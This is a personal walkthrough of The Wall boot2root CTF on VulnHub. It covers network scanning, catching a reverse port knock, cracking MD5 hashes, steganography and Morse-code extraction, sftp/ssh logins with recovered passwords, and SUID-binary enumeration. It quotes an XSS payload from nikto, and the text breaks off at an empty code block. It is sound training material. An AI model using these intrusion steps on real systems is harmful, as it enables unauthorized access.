# The Wall CTF

[The Wall CTF](https://www.vulnhub.com/entry/the-wall-1,130/) looked interesting so I started working on it after getting the [CSharp: VulnJSON](csharp-vulnjson.md) done. The description read as below:

> In 1965, one of the most influential bands of our times was formed.. Pink Floyd. This boot2root box has been created to celebrate 50 years of Pink Floyd's contribution to the music industry, with each challenge giving the attacker an introduction to each member of the Floyd.

> You challenge is simple... set your controls for the heart of the sun, get root, and grab the flag! Rock on!

I've heard many of the Pink Floyd songs but I do not know many of the information related to Pink Floyd which could of course help in the course of working on this CTF challenge.

So, here I started with identifying the host IP using `ARP-SCAN(1)`. I know that the `ARP-SCAN(1)` result usually shows `CADMUS COMPUTER SYSTEMS` as the result and hence I know which one is my VM (I do have mac address too).

The next step is `NMAP(1)` which looked like below:

```shell
$ nmap -T5 -A 192.168.168.200

Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-25 14:09 CST
Nmap scan report for 192.168.168.200
Host is up (0.00025s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:AE:CB:01 (Cadmus Computer Systems)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.168.200

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.68 seconds
```

As you see from the log above, we don't have any open or filtered port on the host which means there's no way we can connect to the host. From the past experiences, in cases like this, its often good to analyze the network traffics because the boxes with no open services often try to connect to the services outside. While we can not connect to any port of the host, its often possible the host might be trying to connect to something on the internal network or internet. This is where the tools like wireshark, tshark and tcpdump can be helpful. In our case, we will use `TCPDUMP(8)`. You should definitely check man page for `TCPDUMP(8)` as its really fantastic tool to view the network traffic. For this CTF, we will use the simple basic `tcpdump` use case. All we do is specify the pcap filter as the expression to filter the traffic. You should definitely check out man page for pcap filter: `man 7 pcap-filter`. Initially I am interested in all the traffics originating from the host.

```shell
$ tcpdump src host 192.168.168.200
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eno1, link-type EN10MB (Ethernet), capture size 262144 bytes
15:05:24.871468 IP 192.168.168.200.16728 > 192.168.168.1.1337: Flags [S], seq 3007729370, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 3462444769 ecr 0], length 0
15:05:24.874296 ARP, Request who-has 192.168.168.3 tell 192.168.168.200, length 28
15:05:24.874301 ARP, Request who-has 192.168.168.3 tell 192.168.168.200, length 28
15:05:24.875913 IP 192.168.168.200.39709 > 192.168.168.4.1337: Flags [S], seq 2659870036, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 1877083112 ecr 0], length 0
15:05:24.878635 IP 192.168.168.200.17830 > 192.168.168.6.1337: Flags [S], seq 361318733, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2545993469 ecr 0], length 0
--- redacted ---
```

Based on the tcpdump output, I saw that the host is aggressively trying to find the services running on port 1337 but I don't know yet what sort of service it is trying to connect to. A good first step is to use the simple netcat listener and see how the traffic looks like.

```shell
$ nc -l 1337

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   

              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don't be surprised when a crack in the ice appears under your feet. - Pink Floyd, The Thin Ice
```

Since I had host system connect to my system and I got no shell, it seemed like it would trigger some sort of action on the host itself. Not having shell means we're back to where we were. More close review of the tcpdump log didn't help much.

Sounds like we have a reverse port knocking in place and now port 80 is open on the server after I got the host connected to port 1337 of my system.

```shell
nmap -T5 -A 192.168.168.200

Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-26 13:28 CST
Nmap scan report for 192.168.168.200
Host is up (0.00023s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:AE:CB:01 (Cadmus Computer Systems)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.168.200

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.18 seconds
```

Cool, we've port 80 accessible to us. No `robots.txt` this time but on a run of `nikto`, we see that it is running [PostNuke CMS](http://www.postnuke.com/module-Content-view-pid-6.html). Upon google search, I see that its development has been stopped and its notorious for too many bugs.

```shell
nikto -h 192.168.168.200
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.168.200
+ Target Hostname:    192.168.168.200
+ Target Port:        80
+ Start Time:         2016-02-26 13:28:40 (GMT-6)
---------------------------------------------------------------------------
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ Retrieved x-powered-by header: PHP/5.6.11
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /postnuke/modules.php?op=modload&name=Web_Links&file=index&req=viewlinkdetails&lid=666&ttitle=Mocosoft Utilities\"%3<script>alert('Vulnerable')</script>: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ 6544 items checked: 3 error(s) and 3 item(s) reported on remote host
+ End Time:           2016-02-26 13:28:53 (GMT-6) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Trying to access anything on `http://192.168.168.200/postnuke/<anyfile_that_exists>.php` gives me a 403 Forbidden with the text `Access denied.`. Upon checking the source code of root page, I see the following comment:
```shell
<!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035-->
```

The `hex_to_ascii()` process gives the string `steg=33115730dbbb370fcbe9720fe632ec05` and cracking the md5 gives the value of `33115730dbbb370fcbe9720fe632ec05` to be `divisionbell`. Seeing the image on index/root page, the comment and the possible username `steg` suggests me the use of the steganography. I was not having any success on the `/postnuke` path either. I ran a exif analysis using `exif`, `exifprobe` and `exiftags` and the following was what I got with `exifprobe`.

```shell
$ exifprobe pink_floyd.jpg
File Name = pink_floyd.jpg
File Type = JPEG
File Size = 114362
@000000000=0       :  <JPEG_SOI>
@0x0000002=2       :    <JPEG_APP0> 0xffe0 length 16, 'JFIF'
@0x000000b=11      :      Version       = 1.2
@0x000000d=13      :      Units         = 'aspect ratio'
@0x000000e=14      :      Xdensity      = 100
@0x0000010=16      :      Ydensity      = 100
@0x0000012=18      :      XThumbnail    = 0
@0x0000013=19      :      YThumbnail    = 0
@0x0000013=19      :    </JPEG_APP0>
@0x0000014=20      :    <JPEG_DQT> length 67
@0x0000059=89      :    <JPEG_DQT> length 67
@0x000009e=158     :    <JPEG_SOF_0> length 17, 8 bits/sample, components=3, width=750, height=717
@0x00000b1=177     :    <JPEG_DHT> length 31 table class = 0 table id = 0
@0x00000d2=210     :    <JPEG_DHT> length 181 table class = 0 table id = 1
@0x0000189=393     :    <JPEG_DHT> length 31 table class = 1 table id = 0
@0x00001aa=426     :    <JPEG_DHT> length 181 table class = 1 table id = 1
@0x0000261=609     :    <JPEG_SOS> length 12  start of JPEG data, 3 components 537750 pixels
@0x001beb8=114360  :  <JPEG_EOI> JPEG length 114362
-0x001beb9=114361  :  END OF FILE
@000000000=0       :  Start of JPEG baseline DCT compressed primary image [750x717] length 114362 (APP0)
-0x001beb9=114361  :    End of JPEG primary image data
Number of images = 1
File Format = JPEG/APP0/JFIF
```

I ran the `strings` command and saw some odds at the top.
```shell
$ strings pink_floyd.jpg | head -n5
JFIF
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```

I tried the same command on the couple of other image files and didn't see such pattern in any of those files but still it could be false positive. Still I kept this in my mind and started exploring more. I searched for [steganography tools](https://en.wikipedia.org/wiki/Steganography_tools) and started downloading and running them. I had a success with steghide.

```shell
$ steghide extract -sf pink_floyd.jpg
Enter passphrase:
wrote extracted data to "pink_floyd_syd.txt".

$ cat pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.
```

We've a new information and the immediately important bit one is `U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0`

```shell
$ base64 -d <<< U3lkQmFycmV0dA==
SydBarrett
```

And, the md5 hash was found to be hash of `pinkfloydrocks`. Cool, this looked like its going good so far. I knew that I could not go any far with `/postnuke/modules.php` because I could not figure out how to bypass this 403. Thinking for a while, the `1965` made a strike in my mind so I tried listening on this port immediately.

```shell
$ nc -l 1965
```

I waited for couple of minutes and it didn't connect back like it did previously. Then, I tried to telnet.

*Note: My target IP is 192.168.168.39 now. I had to re-import appliance due to vhdd failure*

```shell
$ telnet 192.168.168.39 1965
Trying 192.168.168.39...
Connected to 192.168.168.200.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.0
```

Holy cow! The ssh listener and I had some information gathered earlier which could be credentials to this.

```shell
$ ssh SydBarrett@192.168.168.39 -p 1965
SydBarrett@192.168.168.39's password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.168.39 closed.
```

So, we know that we need to use sftp client instead.
```shell
$ sftp -P 1965 SydBarrett@192.168.168.39
SydBarrett@192.168.168.39's password:
Connected to 192.168.168.39.
sftp> ls -a1
.
..
.mail
bio.txt
syd_barrett_profile_pic.jpg  
sftp> cat bio.txt
Invalid command.
sftp> get bio.txt /tmp
Fetching /bio.txt to /tmp/bio.txt
/bio.txt                                                                                                                                                                                              100% 1912     1.9KB/s   00:00    
sftp> get syd_barrett_profile_pic.jpg /tmp
Fetching /syd_barrett_profile_pic.jpg to /tmp/syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg
sftp> ls -a1 .mail
.mail/.
.mail/..
.mail/.stash
.mail/sent-items
sftp> get .mail/.stash /tmp/stash
Fetching /.mail/.stash/ to /tmp/stash
Cannot download non-regular file: /.mail/.stash/
sftp> get .mail/sent-items /tmp/
Fetching /.mail/sent-items to /tmp/sent-items
/.mail/sent-items
sftp> ls -a1 .mail/.stash
.mail/.stash/.
.mail/.stash/..
.mail/.stash/eclipsed_by_the_moon
sftp> get .mail/.stash/eclipsed_by_the_moon /tmp
Fetching /.mail/.stash/eclipsed_by_the_moon to /tmp/eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon                                                                                                                                                                    100%   47MB  15.5MB/s   00:03

$ cat /tmp/bio.txt
"Roger Keith "Syd" Barrett (6 January 1946 – 7 July 2006) was an English musician, composer, singer, songwriter, and painter. Best known as a founder member of the band Pink Floyd, Barrett was the lead singer, guitarist and principal songwriter in its early years and is credited with naming the band. Barrett was excluded from Pink Floyd in April 1968 after David Gilmour took over as their new frontman, and was briefly hospitalized amid speculation of mental illness.

Barrett was musically active for less than ten years. With Pink Floyd, he recorded four singles, their debut album (and contributed to the second one), and several unreleased songs. Barrett began his solo career in 1969 with the single "Octopus" from his first solo album, The Madcap Laughs (1970). The album was recorded over the course of a year with five different producers (Peter Jenner, Malcolm Jones, David Gilmour, Roger Waters and Barrett himself). Nearly two months after Madcap was released, Barrett began working on his second and final album, Barrett (1970), produced by Gilmour and featuring contributions from Richard Wright. He went into self-imposed seclusion until his death in 2006. In 1988, an album of unreleased tracks and outtakes, Opel, was released by EMI with Barrett's approval.

Barrett's innovative guitar work and exploration of experimental techniques such as dissonance, distortion and feedback influenced many musicians, including David Bowie and Brian Eno. His recordings are also noted for their strongly English-accented vocal delivery. After leaving music, Barrett continued with painting and dedicated himself to gardening. Biographies began appearing in the 1980s. Pink Floyd wrote and recorded several tributes to him, most notably the 1975 album Wish You Were Here, which included "Shine On You Crazy Diamond", as homage to Barrett."

Source: Wikipedia (https://en.wikipedia.org/wiki/Syd_Barrett)

$ cat /tmp/sent-items
Date: Sun, 24 Oct 1965 18:45:21 +0200
From: Syd Barrett <syd@pink.floyd>
Reply-To: Syd Barret <syd@pink.floyd>
To: Roger Waters <roger@pink.floyd>
Subject: Had to hide the stash

Roger... I had to hide the stash.

Usual deal.. just use the scalpel when you find it.

Ok, sorry for that.

Rock on man

"Syd"

$ file /tmp/eclipsed_by_the_moon
/tmp/eclipsed_by_the_moon: gzip compressed data, last modified: Tue Nov 10 18:15:47 2015, from Unix
```

Now, I had a picture, a bio, an e-mail sent to Roger Waters regarding the hidden stash and hopefully the stash that Syd was referring to. I ran exif related tools and strings but nothing helpful. I ran out of pointers on what could be the passphrase for steghide. The `eclipsed_by_the_moon` was a gzip compressed file so I extracted it and went ahead.

```shell
$ tar xvfz eclipsed_by_the_moon
eclipsed_by_the_moon.lsd
```

We have another file with extension `.lsd`.
```shell
$ file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 (volumes > 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
```

Hey, that's a DOS/MBR boot sector? I remember one of the previous notes referring to `scalpel` which is a known tool for recovering deleted files from the filesystems. So I was pretty sure that I had to use the disk recovery tools. I had `testdisk` installed on my system already and thought of using it. Upon running testdisk (`testdisk /tmp/eclipsed_by_the_moon.lsd`), I was able to find an image named `rogerwaters.jpg`.

We got the image of rogerwaters with a dialog box.

![Roger Waters](images/rogerwaters.jpg "Roger Waters")

I initially thought this (`hello_is_there_anybody_in_there`) might be the passphrase for one of the last two images. Turned out it was not. Maybe I should try ssh/sftp again.

```shell
ssh -p 1965 RogerWaters@192.168.168.39
RogerWaters@192.168.168.39's password:
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'   
$
```

This time, it gave me the ssh access. So, I started further investigation from there.

```shell
$ ls -liah
total 176
16384 drwx------  3 RogerWaters  RogerWaters   512B Oct 28 09:29 .
    2 drwxr-xr-x  7 root         wheel         512B Oct 24 17:36 ..
16387 -rw-r--r--  1 RogerWaters  RogerWaters    87B Oct 24 17:35 .Xdefaults
16388 -rw-r--r--  1 RogerWaters  RogerWaters   773B Oct 24 17:35 .cshrc
16389 -rw-r--r--  1 RogerWaters  RogerWaters   103B Oct 24 17:35 .cvsrc
16390 -rw-r--r--  1 RogerWaters  RogerWaters   398B Oct 26 04:01 .login
16391 -rw-r--r--  1 RogerWaters  RogerWaters   175B Oct 24 17:35 .mailrc
16392 -rw-r--r--  1 RogerWaters  RogerWaters   218B Oct 24 17:35 .profile
16385 drwx------  2 RogerWaters  RogerWaters   512B Oct 26 03:56 .ssh
16394 -rw-r--r--  1 RogerWaters  RogerWaters   2.8K Oct 26 08:57 bio.txt
16393 -rw-r--r--  1 RogerWaters  RogerWaters     0B Oct 28 05:02 mbox
16395 -rw-r--r--  1 RogerWaters  RogerWaters  47.0K Oct 26 06:16 roger_waters_profile_pic.jpg
16396 -rw-r--r--  1 RogerWaters  RogerWaters  16.2K Oct 26 06:23 secret-diary
```

I decided to copy files quickly using scp.

```shell
$ mkdir /tmp/rogers
$ scp -P 1965 -r RogerWaters@192.168.168.39:~ /tmp/rogers/
RogerWaters@192.168.168.39's password:
authorized_keys                                                                                                                                                                                       100%    0     0.0KB/s   00:00    
.Xdefaults                                                                                                                                                                                            100%   87     0.1KB/s   00:00    
.cshrc                                                                                                                                                                                                100%  773     0.8KB/s   00:00    
.cvsrc                                                                                                                                                                                                100%  103     0.1KB/s   00:00    
.login                                                                                                                                                                                                100%  398     0.4KB/s   00:00    
.mailrc                                                                                                                                                                                               100%  175     0.2KB/s   00:00    
.profile                                                                                                                                                                                              100%  218     0.2KB/s   00:00    
mbox                                                                                                                                                                                                  100%    0     0.0KB/s   00:00    
bio.txt                                                                                                                                                                                               100% 2853     2.8KB/s   00:00    
roger_waters_profile_pic.jpg                                                                                                                                                                          100%   47KB  47.1KB/s   00:00    
secret-diary                                                                                                                                                                                          100%   16KB  16.2KB/s   00:00  
```

Looking at the files, there were no obvious pointers to go ahead and the exif and steg analysis of the profile picture didn't produce anything either.

So, I got back to the ssh session and started performing the basic enumerations to find various files that could be of interest for me to exploit the system. I started exploring the file system and tried to look for possible backdoors, daemons or vulnerable services.

```shell
$ uname -a
OpenBSD thewall.localdomain 5.8 GENERIC#1066 i386
$ find / -perm -6000 -type f -exec ls -liah {} + 2> /dev/null
52079 -r-sr-sr-x  1 root          daemon         29.8K Aug 16  2015 /usr/bin/lpr
52080 -r-sr-sr-x  1 root          daemon         25.8K Aug 16  2015 /usr/bin/lprm
 3280 -rws--s--x  1 NickMason     NickMason       7.1K Aug  8  2015 /usr/local/bin/brick
 3281 -rwsr-s---  1 DavidGilmour  RichardWright   7.3K Oct 25 07:58 /usr/local/bin/shineon
26048 -r-sr-sr-x  2 root          authpf         21.8K Aug 16  2015 /usr/sbin/authpf
26048 -r-sr-sr-x  2 root          authpf         21.8K Aug 16  2015 /usr/sbin/authpf-noip
```

Among the output above, the most interesting ones are `/usr/local/bin/brick` and `/usr/local/bin/shineon`. While `/usr/local/bin/shineon` seems to have tighter permission (we're logged in as RogerWaters), the `/usr/local/bin/brick` has the executable bit on for all users. Great! Maybe, not. I could not read the content of the file as-is or run `strings` over it.

```shell
$ /usr/local/bin/brick




What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!




Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
```

I gave the name as `Nick Mason` after quick google search for confirmation and it got me logged in as `NickMason`. I later figured out that I had to input `Nick Mason` with the space in between although I would get error: `/bin/sh: Cannot determine current working directory`. But, hey we've something that takes input. Maybe its the injection point? Also, with quick playing, I figured out it would not take no more than 1024 characters as the input.

```shell
$ whoami
NickMason
$ groups NickMason
NickMason
$ cd /home/NickMason/
$ ls -liah
total 1576
24576 drwx------  3 NickMason  NickMason   512B Aug  8  2015 .
    2 drwxr-xr-x  7 root       wheel       512B Oct 24 17:36 ..
24579 -rw-r--r--  1 NickMason  NickMason    87B Oct 24 17:34 .Xdefaults
24580 -rw-r--r--  1 NickMason  NickMason   773B Oct 24 17:34 .cshrc
24581 -rw-r--r--  1 NickMason  NickMason   103B Oct 24 17:34 .cvsrc
24582 -rw-r--r--  1 NickMason  NickMason   398B Oct 24 17:34 .login
24583 -rw-r--r--  1 NickMason  NickMason   175B Oct 24 17:34 .mailrc
24584 -rw-r--r--  1 NickMason  NickMason   218B Oct 24 17:34 .profile
24577 drwx------  2 NickMason  NickMason   512B Oct 28 04:48 .ssh
24595 -rw-r--r--  1 NickMason  NickMason   1.3K Oct 26 08:58 bio.txt
24602 -rw-r--r--  1 NickMason  NickMason     0B Oct 28 05:02 mbox
24594 -rw-r--r--  1 NickMason  NickMason   749K Aug  8  2015 nick_mason_profile_pic.jpg
$ cp nick_mason_profile_pic.jpg /tmp/
$ chmod a+rw /tmp/nick_mason_profile_pic.jpg
```

Well, I could have just scp'd from the box itself to my system but either way, I wanted to get the file to the local because of the size unless it was a bit higher quality image. Anyway, once I copied the file to my system, I could not open it with the image viewer.

```shell
$ file nick_mason_profile_pic.jpg
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, ~160000 bps, created by: Xiph.Org libVorbis I
```

It revealed that its an Ogg file.. Ahh, trying to deceive meh? :D I renamed and listened to the music. I also thought in the background that this could also be a steganography stuff again. I immediately remembered the `cat somefile.ogg sometext_to_hide.txt > my-awesome-music.ogg` trick and tried to unzip the file. Well, it didn't work. Honestly, this point was where I got stuck for really long time. I read a lot on how data could be encoded and saved on audio files and read various features of audios. This is where I had to take a hint but I was running out of ideas. I checked one of the walkthroughs quickly to see if my route is correct or not and I saw that I had to get Morse code from the audio.

Rather than following the usual route now, I thought of playing with `sox`. I did come across [experimental morse decoder](http://morsecode.scphillips.com/labs/decoder/) written purely in javascript but didn't work on it.

```shell
$ sudo apt-get install -y sox
$ sox nick_mason_profile_pic.ogg output.dat
$ head -n10 output.dat
; Sample Rate 44100
; Channels 2
               0                0               0
   2.2675737e-05                0               0
   4.5351474e-05                0               0
   6.8027211e-05                0               0
   9.0702948e-05                0               0
   0.00011337868                0               0
   0.00013605442                0               0
   0.00015873016                0               0
```

I found some online post which had some information and also had done the work of creating morse code. I used the same [python script](codes/morse-code.py).

```shell
$ python morse-code.py
 .....--...-............-..-..........-....-.--.......-........................-.................................................................................................................................................................--..-.--....-.-..-.....-.............-...---.-.--..--.----.........------....-.....---..........-........................................-..-....................................--.-...-......---.....-......---.-----.....-...-....-...-......---.---.-.-...---.........-..-.-............-...--.---.-.-.-.....-.....-.-......-.......--.---.-.-....-.-..-----.--.--..-----....-.--.-.-....-..----------.-...-.------.-.--.-------..-.----...-..---.-----.....-.--...........-........-.-..-....-.-...-..-.-.----............................-----.----.-.-..--..-..-....--..........-.....--..-.........-...------...--.-.-.....--.------..-------..-..--.-.....-.-...................-..-...---...-.-----.-.---.-.----..-..------.---.------------.---..-..--.-------....--.----------.--..----.--.-------.----.-.-..--.---.---...----.-..-...--.---.-..-.---.--.--.-----..---.-.--.-------......-.-..-..---.--......-..--.-..-.-....-------...-----....-...---...--..............-.......................................-.........-----.-.---.-.-....-.-.......---------...--.-.-....-..---.--...---.--......-.-...-.............-.-...-..--..-.----.................-.-............-...---.--..--....-..--.--.----.-.----..--.-.-....-----.-.--.--.------.------.----.-.-..---.-.--...--.......--.-..-.-.............-..-.-.-....--.-.---.....-...--.--...------.....---..---..........--..-.......-.....-.-.-.-.-.-.-.---.-.-.----................-............................................................................................................................................................................................................................................................................................................................................................................................................................................................-..................-..................-.....................................................................................................................................................................-........................................................................................ ..... ..... ..... . .
```

This looked good but it seemed I had to remove the music, create an audio that consists of only morse code and run the sox and script over it (or the other way around?). ~~I still need to play with it.~~

Its been a while and I had no time to work on it. Apparently, this script was not perfect for this use case and I did not have enough time to work on parsing and getting the result via python code but for those who wish to have a starting point using sox. So, the way I did was listening to the audio reduced down by 30% and to one-fifth of the normal speed. I used _playitslowly_ to do this. You can hear the beep of morse codes along with the normal music but I tried to cleaned up little bit which produced [this audio file](audio/nick_mason_cleaned.ogg).

You can also see the spectrum which looks much better:
![Audacity Isolation](images/audacity_thewall.png "Audacity Isolation")

This translated to `.-. .. -.-. .... .- .-. -.. .-- .-. .. --. .... - .---- ----. ....- ...-- -.-- .- .-. ..-. .. ... .-` which translated to `RICHARDWRIGHT1943YARFISA `. Google search for `richard wright yarfisa` provides autocorrected result for `richard wright farfisa` so I knew I had to adjust that.

With couple of attempts, I was able to login on the server as RichardWright. I knew the username from one of the texts and previous patterns and `1943farfisa`.

```shell
$ su RichardWright
Password:
ksh: Cannot determine current working directory

$ id
uid=1003(RichardWright) gid=1003(RichardWright) groups=1003(RichardWright)
```

Now, did you note that there was another suid file : `/usr/local/bin/shineon` which had user:group permission of `DavidGilmour:RichardWright`. Cool.

```shell
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
1

     March 2016
Su Mo Tu We Th Fr Sa
       1  2  3  4  5
 6  7  8  9 10 11 12
13 14 15 16 17 18 19
20 21 22 23 24 25 26
27 28 29 30 31      

Time - The Dark Side of the Moon

Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
2
Echoes - Meddle
RogerWaters ttyp0    Mar  9 19:35   (192.168.168.70)


Press ENTER to continue.
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
3
Is There Anybody Out There? - The Wall
PING www.google.com (216.58.216.68): 56 data bytes
64 bytes from 216.58.216.68: icmp_seq=0 ttl=57 time=13.375 ms
64 bytes from 216.58.216.68: icmp_seq=1 ttl=57 time=13.181 ms
64 bytes from 216.58.216.68: icmp_seq=2 ttl=57 time=13.943 ms
--- www.google.com ping statistics ---
3 packets transmitted, 3 packets received, 0.0% packet loss
round-trip min/avg/max/std-dev = 13.181/13.499/13.943/0.350 ms
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
No mail for RichardWright
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
5
Quitting program!
```

This quick session seemed like it would not give anything quickly but I also did notice various messages in between. More shell session:

```shell
$ cat bio.txt                                                                                                                                                                                                                          
"Richard William "Rick" Wright (28 July 1943 – 15 September 2008) was an English musician, composer, singer and songwriter. He was a founder member, keyboardist and vocalist of the progressive rock band Pink Floyd, performing on the majority of the group's albums including The Piper at the Gates of Dawn, The Dark Side of the Moon, Wish You Were Here and The Division Bell, and playing on all of their tours.[3]

Wright grew up in Hatch End in London and met future Pink Floyd bandmates Roger Waters and Nick Mason while studying at the Regent Street Polytechnic. The group found commercial success in 1967 with frontman Syd Barrett before Barrett's instability led to him being replaced by David Gilmour, with Wright taking over songwriting duties with Waters. Initially a straightforward singer / songwriter, Wright later acted as an arranger to Waters and Gilmour's compositions. He began to contribute less towards the end of the 1970s and left the band after touring The Wall in 1981. He rejoined the band as a session player in 1987 for A Momentary Lapse of Reason, and became a full-time member again for The Division Bell in 1994. Sessions with Wright during this period were later released on the album The Endless River. Away from the Floyd, Wright recorded two solo albums, including a collaboration with Anthony Moore on Broken China, and briefly formed the duo Zee. After rejoining Waters, Mason and Gilmour as Pink Floyd for Live 8 in 2005, he became part of Gilmour's regular solo touring band, singing occasional lead on songs such as "Arnold Layne", before his death in September 2008.

Overshadowed by band mates Barrett, Waters and Gilmour and being the quietest and most reserved member of Pink Floyd, Wright's contributions have been overlooked, but his death brought a reappraisal and recognition of his talents. His jazz and improvisation influences and keyboard performances were an important part of the Pink Floyd sound; being a prominent player of the Farfisa and Hammond organs and the Kurzweil synthesizer. Wright sang regularly in the band, and occasionally took the lead vocal on Pink Floyd songs such as "Time", "Remember a Day" and "Wearing the Inside Out"."

Source: Wikipedia (https://en.wikipedia.org/wiki/Richard_Wright_%28musician%29)
$ cat mbox  
From DavidGilmour@thewall.localdomain Tue Oct 27 01:41:18 2015
Return-Path: DavidGilmour@thewall.localdomain
Delivered-To: RichardWright@thewall.localdomain
Received: from localhost (thewall.localdomain [local])
        by thewall.localdomain (OpenSMTPD) with ESMTPA id 3ad74b19
        for <RichardWright@thewall.localdomain>;
        Tue, 27 Oct 2015 01:41:18 +1000 (AEST)
From: David Gilmour <DavidGilmour@thewall.localdomain>
Date: Tue, 27 Oct 2015 02:41:18 +1000 (AEST)
Message-Id: <9059884549097248741.enqueue@thewall.localdomain>
To: RichardWright@thewall.localdomain
Subject: Re: Brain Damage
Status: RO

G'day Rick.. how's the ivory tickling going?

There's plenty of bricks in the wall, so I'll give you a few when we catch up.

For now, just use that command I gave you with the menu.

Dave

----------

Hey Dave,
I feel like we're back in the studio for The Dark Side of the Moon.
Sorry to keep bugging you, but can you tell me again how to do things
when I'm on thewall.
Rick

samar@techgaun $ scp -P 1965 RichardWright@192.168.168.39:/home/RichardWright/richard_wright_profile_pic.jpg .
RichardWright@192.168.168.39's password:
Permission denied, please try again.

$ cp richard_wright_profile_pic.jpg /tmp && chmod a+r /tmp/richard_wright_profile_pic.jpg

samar@techgaun $ scp -P 1965 RogerWaters@192.168.168.39:/tmp/richard_wright_profile_pic.jpg .
```

And, this worked fine so most likely ssh is not allowed for RichardWright.

![Richard Wright](images/richard_wright_profile_pic.jpg "Richard Wright")

Upon further checks, the strings returned interesting information for mail in menu.

```shell
